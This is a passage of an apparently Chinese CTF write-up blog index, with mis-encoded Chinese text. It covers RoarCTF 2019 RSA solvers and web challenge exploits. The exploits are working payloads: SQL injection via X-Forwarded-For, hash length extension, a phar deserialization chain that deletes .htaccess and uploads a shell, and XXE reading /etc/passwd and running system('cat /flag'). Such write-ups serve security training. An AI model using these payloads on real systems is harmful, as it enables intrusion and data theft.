842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458023 while True: p_close = gmpy2.next_prime(166*z_close) if n % p_close == 0: p = p_close q = n // p break z_close -= 1 # p = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 # q = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) print number.long_to_bytes(pow(c,d,n)) babyrsa import sympy import random def myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A) p=myGetPrime() #A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 #B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 q=myGetPrime() #A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 #B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 r=myGetPrime() n=p*q*r #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 c=pow(flag,e,n) #e=0x1001 #c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 #so,what is the flag? ç›´æ¥æ±‚bçš„é˜¶ä¹˜æ˜¯ä¸å¯èƒ½çš„,é€’å½’è¾¾åˆ°æœ€å¤§é™åˆ¶æ¬¡æ•°ä¹Ÿæ±‚ä¸å‡ºæ¥.\nè¿™é‡Œè¦ç”¨åˆ°å¨å°”é€Šå®šç†\nåˆ¤å®šä¸€ä¸ªæ•°å­—æ˜¯ç´ æ•°çš„å……åˆ†å¿…è¦æ¡ä»¶:\n(p-1)! = -1 (mod p)\nåœ¨è¿™å¥—é¢˜ä¸­å¯ä»¥å‘ç°(-1)(A-1)(A-2)...(B+2)(B+1)æ˜¯B! å…³äºAçš„é€†å…ƒ,ç„¶åå°±å¥½æ±‚äº†\nimport gmpy2 import sympy from Crypto.Util import number def myprime(a, b): ans = 1 for i in range(b+1, a): ans = (ans *i) % a ans = -1 * ans num = gmpy2.invert(ans ,a) return sympy.nextprime(num) A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 p = myprime(A1, B1) A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 q = myprime(A2, B2) n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 enc=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 r = n /(p*q) e=0x1001 phi = (p-1)*(q-1)*(r-1) d = gmpy2.invert(e, phi) m = pow(enc, d, n) print number.long_to_bytes(m) ","permalink":"https://dragonbox.top/posts/ctf-roarctfwp/","summary":"\u003ch1 id=\"web\"\u003eweb\u003c/h1\u003e\n\u003ch2 id=\"online_proxy\"\u003eonline_proxy\u003c/h2\u003e\n\u003cp\u003eç‰¹å¾: ç¬¬ä¸€æ¬¡ç™»å½•åæºä»£ç å†…å®¹æœ‰å¦‚ä¸‹:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114142027467.png\" alt=\"image-20211114142027467\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eæ¢ä¸€ä¸ª\u003cstrong\u003eX-Forwarded-For\u003c/strong\u003e åä¼šå‘ç°currentipæ˜¯æ ¹æ®xffåˆ¤åˆ«çš„\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-20211114142033017.png\" alt=\"image-20211114142033017\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆæœ‰ç†ç”±è®¤ä¸ºä¸Šä¸€ä¸ªipè¢«å­˜å‚¨è¿›äº†æ•°æ®åº“ä¸­,å¹¶åœ¨æ¯æ¬¡æ£€æµ‹åˆ°è®¿é—®ipå’Œä¸Šä¸€ä¸ªipä¸åŒçš„æ—¶å€™å°±ä¼šæ”¹å˜æ•°æ®åº“. æºç è¿™é‡Œä¹Ÿå†™åˆ°äº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select current_ip, last_ip from ip_log where uuid = \u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ecount\u003c/span\u003e($result) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e($ip \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;current_ip\u0026#39;\u003c/span\u003e]) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $last_ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;current_ip\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;delete from ip_log where uuid=\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    } \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        $last_ip \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e $result[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e][\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;last_ip\u0026#39;\u003c/span\u003e];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003equery\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;insert into ip_log values (\u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($uuid)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;, \u0026#39;\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eaddslashes\u003c/span\u003e($ip)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#39;, \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$last_ip\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;);\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edie\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026lt;!-- Debug Info: \u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e Duration: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$time\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e s \u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e Current Ip: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e$ip\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e($last_ip \u003cspan style=\"color:#f92672\"\u003e!==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e?\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eLast Ip: \u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e$last_ip \u003cspan style=\"color:#f92672\"\u003e:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34; --\u0026gt;\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£æ³•:\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨\u003ccode\u003e1'|1|'1\u003c/code\u003eä½œä¸ºxffè®¿é—®ç½‘ç«™ç½‘ç«™ , è®¿é—®æˆåŠŸä¹‹åæ”¹å˜xff, å†æ¬¡è®¿é—®, è¿™ä¸ªæ—¶å€™ç”±äºå‰åxffä¸ä¸€è‡´, åŸæ¥å­˜å‚¨è¿›æ•°æ®åº“currentipçš„ipè¢«é‡æ–°æå–å‡ºæ¥å­˜è¿›lastipé¡¹ä¸­, å¦‚æœè¿™ä¸ªlastipæ²¡æœ‰è¿‡æ»¤çš„è¯,å°±å¯ä»¥é€ æˆ\u003cstrong\u003eäºŒæ¬¡æ³¨å…¥\u003c/strong\u003e, äº‹å®ä¸Šä¹Ÿç¡®å®å¦‚æ­¤, ä½†è¿™ä¸ªå¯èƒ½å¾—çŒœ\u0026hellip;\u0026hellip;åœ¨ç¬¬äºŒæ¬¡è®¿é—®ä¹‹å, payloadè¢«é‡æ–°æ’å…¥è¿›æ•°æ®åº“ä¸­, å¸¦ç€ç¬¬äºŒæ¬¡è®¿é—®çš„xffæ¥ç¬¬ä¸‰æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™,å¯ä»¥çœ‹åˆ°\u003c/p\u003e","title":"RoarCTF 2019å¤ç°"},{"content":"boring code source code\n\u0026lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(\u0026#39;/data:\\/\\//i\u0026#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[\u0026#39;url\u0026#39;])){ $url = $_POST[\u0026#39;url\u0026#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(\u0026#39;/baidu\\.com$/\u0026#39;, $r[\u0026#39;host\u0026#39;])) { $code = file_get_contents($url); if (\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z]+\\((?R)?\\)/\u0026#39;, NULL, $code)) { if (preg_match(\u0026#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\u0026#39;, $code)) { echo \u0026#39;bye~\u0026#39;; } else { eval($code); } } } else { echo \u0026#34;error: host not allowed\u0026#34;; } } else { echo \u0026#34;error: invalid url\u0026#34;; } }else{ highlight_file(__FILE__); } æ€è·¯: æ³¨å†Œä¸€ä¸ªxxxxbaidu.com å½¢å¼çš„åŸŸå.ç»‘å®šåˆ°æœåŠ¡å™¨ä¸Šåæ”¾ä¸Šè‡ªå·±çš„ä»£ç ,payload\nif(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array())))))))); echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv())))))))))))); è¿™ä¸¤ä¸ªpayloadéƒ½å¾ˆç²¾å½©, æ¶‰åŠçš„çŸ¥è¯†ç‚¹å¦‚ä¸‹:\ncrypt å‡½æ•°æ²¡æœ‰keyçš„æ—¶å€™éšæœºç”Ÿæˆkeyè¿›è¡ŒåŠ å¯†, å¦‚æœå¤šå°è¯•å‡ æ¬¡åŠ å¯†çš„è¯å°±ä¼šå‘ç°æœ‰å‡ æ¬¡çš„åŠ å¯†ç»“æœä¸­çš„æœ«å°¾æœ‰ç‚¹å·.\nordå‡½æ•°ä¼ å…¥å­—ç¬¦ä¸²çš„æ—¶å€™, åªè¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç \nlocaleconvå‡½æ•°è¿”å›ä¸€ç»„åŒ…å«æœ¬åœ°æ•°å­—å’Œè´§å¸æ ¼å¼çš„æ•°ç»„, æ•°ç»„ç¬¬ä¸€ä½æ˜¯\u0026quot;å°æ•°ç‚¹å­—ç¬¦\u0026quot;, ä¹Ÿå°±æ˜¯ç‚¹å·\nphp \u0026gt; var_dump(localeconv()); array(18) { [\u0026#34;decimal_point\u0026#34;]=\u0026gt; string(1) \u0026#34;.\u0026#34; [\u0026#34;thousands_sep\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;int_curr_symbol\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;currency_symbol\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;mon_decimal_point\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;mon_thousands_sep\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;positive_sign\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;negative_sign\u0026#34;]=\u0026gt; string(0) \u0026#34;\u0026#34; [\u0026#34;int_frac_digits\u0026#34;]=\u0026gt; int(127) [\u0026#34;frac_digits\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_cs_precedes\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_sep_by_space\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_cs_precedes\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_sep_by_space\u0026#34;]=\u0026gt; int(127) [\u0026#34;p_sign_posn\u0026#34;]=\u0026gt; int(127) [\u0026#34;n_sign_posn\u0026#34;]=\u0026gt; int(127) [\u0026#34;grouping\u0026#34;]=\u0026gt; array(0) { } [\u0026#34;mon_grouping\u0026#34;]=\u0026gt; array(0) { } } php \u0026gt; pos() å‡½æ•°æ˜¯currentå‡½æ•°çš„åˆ«å\ntime() è¿”å›æ—¶é—´æˆ³æ•´æ•°, ä»ä¸­æ— æ³•æå‡ºç‚¹å·\nlocaltimeç¬¬ä¸€å‚æ•°é»˜è®¤æ˜¯time(), ä¸èƒ½æ¥å—å¸ƒå°”å€¼ä¹Ÿå°±æ˜¯chdirçš„è¿”å›å€¼\nlocaltime() è¿”å›æ•°ç»„æ¥è¡¨ç¤ºå½“å‰æ—¶é—´, ç¬¬ä¸€é¡¹æ˜¯å½“å‰çš„ç§’æ•°, è¦è®©chrè½¬æ¢æˆç‚¹å·çš„è¯å°±è¦åœ¨ç¬¬46ç§’æ‰§è¡Œ\nezCMS æºç www.zip, å…³é”®ä»£ç å¦‚ä¸‹:\nèº«ä»½éªŒè¯éƒ¨åˆ†\nfunction login(){ $secret = \u0026#34;********\u0026#34;; setcookie(\u0026#34;hash\u0026#34;, md5($secret.\u0026#34;adminadmin\u0026#34;)); return 1; } function is_admin(){ $secret = \u0026#34;********\u0026#34;; $username = $_SESSION[\u0026#39;username\u0026#39;]; $password = $_SESSION[\u0026#39;password\u0026#39;]; if ($username == \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $password != \u0026#34;admin\u0026#34;){ if ($_COOKIE[\u0026#39;user\u0026#39;] === md5($secret.$username.$password)){ return 1; } } return 0; } å¯ä»¥æ˜æ˜¾çœ‹å‡ºè¿™é‡Œæœ‰å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡».\nå“ˆå¸Œç”Ÿæˆ\n./hash_extender -d \u0026#39;admin\u0026#39; -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a \u0026#39;ch3n9w\u0026#39; --out-data-format=html -l 13 --quiet å¾—åˆ°äº†æ–°çš„å“ˆå¸Œå€¼,æ·»åŠ åˆ°cookie[user]ä¸­\nç„¶åæ–°çš„ç™»å½•ç”¨æˆ·å: admin\nç”¨æˆ·å¯†ç :admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch3n9w\nç¬¬äºŒéƒ¨åˆ†ååºåˆ—åŒ–ä»£ç å®¡è®¡.\nclass Check{ public $filename; function __construct($filename) { $this-\u0026gt;filename = $filename; } function check(){ $content = file_get_contents($this-\u0026gt;filename); $black_list = [\u0026#39;system\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;exec\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;passthru\u0026#39;,\u0026#39;`\u0026#39;,\u0026#39;assert\u0026#39;]; foreach ($black_list as $k=\u0026gt;$v){ if (stripos($content, $v) !== false){ die(\u0026#34;your file make me scare\u0026#34;); } } return 1; } } class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this-\u0026gt;filepath = $filepath; $this-\u0026gt;filename = $filename; } public function view_detail(){ if (preg_match(\u0026#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i\u0026#39;, $this-\u0026gt;filepath)){ die(\u0026#34;nonono~\u0026#34;); } $mine = mime_content_type($this-\u0026gt;filepath); $store_path = $this-\u0026gt;open($this-\u0026gt;filename, $this-\u0026gt;filepath); $res[\u0026#39;mine\u0026#39;] = $mine; $res[\u0026#39;store_path\u0026#39;] = $store_path; return $res; } public function open($filename, $filepath){ $res = \u0026#34;$filename is in $filepath\u0026#34;; return $res; } function __destruct() { if (isset($this-\u0026gt;checker)){ $this-\u0026gt;checker-\u0026gt;upload_file(); } } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; function __construct($filename, $file_tmp, $size) { $this-\u0026gt;upload_dir = \u0026#39;sandbox/\u0026#39;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if (!file_exists($this-\u0026gt;upload_dir)){ mkdir($this-\u0026gt;upload_dir, 0777, true); } if (!is_file($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;)){ file_put_contents($this-\u0026gt;upload_dir.\u0026#39;/.htaccess\u0026#39;, \u0026#39;lolololol, i control all\u0026#39;); } $this-\u0026gt;size = $size; $this-\u0026gt;filename = $filename; $this-\u0026gt;file_tmp = $file_tmp; $this-\u0026gt;content_check = new Check($this-\u0026gt;file_tmp); $profile = new Profile(); $this-\u0026gt;checker = $profile-\u0026gt;is_admin(); } public function upload_file(){ if (!$this-\u0026gt;checker){ die(\u0026#39;u r not admin\u0026#39;); } $this-\u0026gt;content_check -\u0026gt; check(); $tmp = explode(\u0026#34;.\u0026#34;, $this-\u0026gt;filename); $ext = end($tmp); if ($this-\u0026gt;size \u0026gt; 204800){ die(\u0026#34;your file is too big\u0026#34;); } move_uploaded_file($this-\u0026gt;file_tmp, $this-\u0026gt;upload_dir.\u0026#39;/\u0026#39;.md5($this-\u0026gt;filename).\u0026#39;.\u0026#39;.$ext); } public function __call($name, $arguments) { } } class Profile{ public $username; public $password; public $admin; public function is_admin(){ $this-\u0026gt;username = $_SESSION[\u0026#39;username\u0026#39;]; $this-\u0026gt;password = $_SESSION[\u0026#39;password\u0026#39;]; $secret = \u0026#34;********\u0026#34;; if ($this-\u0026gt;username === \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; $this-\u0026gt;password != \u0026#34;admin\u0026#34;){ if ($_COOKIE[\u0026#39;user\u0026#39;] === md5($secret.$this-\u0026gt;username.$this-\u0026gt;password)){ return 1; } } return 0; } function __call($name, $arguments) { $this-\u0026gt;admin-\u0026gt;open($this-\u0026gt;username, $this-\u0026gt;password); } } åˆ©ç”¨é“¾:\nä¸Šä¼ exp.phar ç»•è¿‡wafä½¿ç”¨php://filter/read=convert.base64-encode/resource=phar://exp.pharè§¦å‘pharè®©ä»–ååºåˆ—ä¸­fileç±»çš„destruct, upload_fileè§¦å‘profileçš„__callå‡½æ•°, è§¦å‘openå‡½æ•° profile-\u0026gt;adminå£°æ˜ä¸ºZipArchiveç±», åˆ©ç”¨è¿™ä¸ªåŸç”Ÿç±»çš„åŒåå‡½æ•°openæ¥åˆ é™¤åŸæœ‰çš„.htaccess, åˆ é™¤å®Œä¹‹åå†ä¼ ä¸€ä¸ªshellå°±å¯ä»¥äº† exp:\n\u0026lt;?php class File{ public $filename; public $filepath; public $checker; function __construct() { $this-\u0026gt;checker = new Admin(); } } class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $file_error; public $content_check; public $obj; public $filepath; function __construct() { $this-\u0026gt;checker = 1; $this-\u0026gt;size = 1024; $this-\u0026gt;content_check = new Profile(); } } class Profile{ public $username; public $password; public $admin; function __construct() { $this-\u0026gt;admin = new ZipArchive(); $this-\u0026gt;username = \u0026#34;/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess\u0026#34;; $this-\u0026gt;password = ZipArchive::OVERWRITE; } } @unlink(\u0026#34;exp.phar\u0026#34;); $phar = new Phar(\u0026#39;exp.phar\u0026#39;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#39;); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $object = new File(); $phar -\u0026gt; setMetadata($object); $phar -\u0026gt; stopBuffering(); shell.php\n\u0026lt;?php echo file_get_contents(\u0026#39;/flag\u0026#39;); rss data protocol format:\ndata:[\u0026lt;mime type\u0026gt;][;charset=\u0026lt;charset\u0026gt;][;base64],\u0026lt;encoded data\u0026gt; è¯´æ˜¯phpå¯¹mine typeä¸æ•æ„Ÿ, é‚£ä¹ˆå¯ä»¥è¿™æ ·å­å†™\ndata://baidu.com/plain;base64,xxxxxxxxx== ç„¶åçœ‹rssçš„å®šä¹‰:\nWhat is RSS?\nIt is a format to share data, defined in the 1.0 version of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed. Recent browsers can read directly RSS files, but a special RSS reader or aggregator may be used too.\næ‰€ä»¥æ‰€è°“çš„rsså°±æ˜¯xml.\nå°è¯•æµ‹è¯•\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE title [ \u0026lt;!ELEMENT title ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34; \u0026gt;]\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;The Blog\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com/\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;A blog about things\u0026lt;/description\u0026gt; \u0026lt;lastBuildDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/lastBuildDate\u0026gt; \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;a post\u0026lt;/description\u0026gt; \u0026lt;author\u0026gt;author@example.com\u0026lt;/author\u0026gt; \u0026lt;pubDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/pubDate\u0026gt; \u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt; \u0026lt;/rss\u0026gt; å°†ä¸Šè¿°å†…å®¹base64ç¼–ç ä¹‹åç”¨ä¹‹å‰çš„dataåè®®ä¼ å…¥è¿›å», è§¦å‘æˆåŠŸ.\næ¥ä¸‹æ¥å°±è¯»å–æºç å°±è¡Œäº†.\nä¸ç†Ÿæ‚‰MVCæ¶æ„\u0026hellip;.è¯»å®Œindex.phpä¹‹åå°±ä¸çŸ¥é“è¯»ä»€ä¹ˆ\u0026hellip;..\nindex.php ä¸­æœ‰routes.php, æ ¹æ®routes.phpå†å»è¯»controllers/Admin.php, ç„¶ååˆå»è¯»views/Admin.php\nç„¶åå…³é”®ä»£ç \nusort($data, create_function(\u0026#39;$a, $b\u0026#39;, \u0026#39;return strcmp($a-\u0026gt;\u0026#39;.$order.\u0026#39;,$b-\u0026gt;\u0026#39;.$order.\u0026#39;);\u0026#39;)); ç›´æ¥æ‹¼æ¥\nexp.xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE title [ \u0026lt;!ELEMENT title ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml\u0026amp;order=%24b%2C%24a)%3B%7Dsystem(\u0026#39;cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134\u0026#39;)%3B%2F%2F\u0026#34; \u0026gt;]\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34; xmlns:atom=\u0026#34;http://www.w3.org/2005/Atom\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;The Blog\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com/\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;A blog about things\u0026lt;/description\u0026gt; \u0026lt;lastBuildDate\u0026gt;Mon, 03 Feb 2014 00:00:00 -0000\u0026lt;/lastBuildDate\u0026gt; \u0026lt;item\u0026gt; \u0026lt;title\u0026gt;\u0026amp;xxe;\u0026lt;/title\u0026gt; \u0026lt;link\u0026gt;http://example.com\u0026lt;/link\u0026gt; \u0026lt;description\u0026gt;a post\u0026lt;/description\u0026gt; 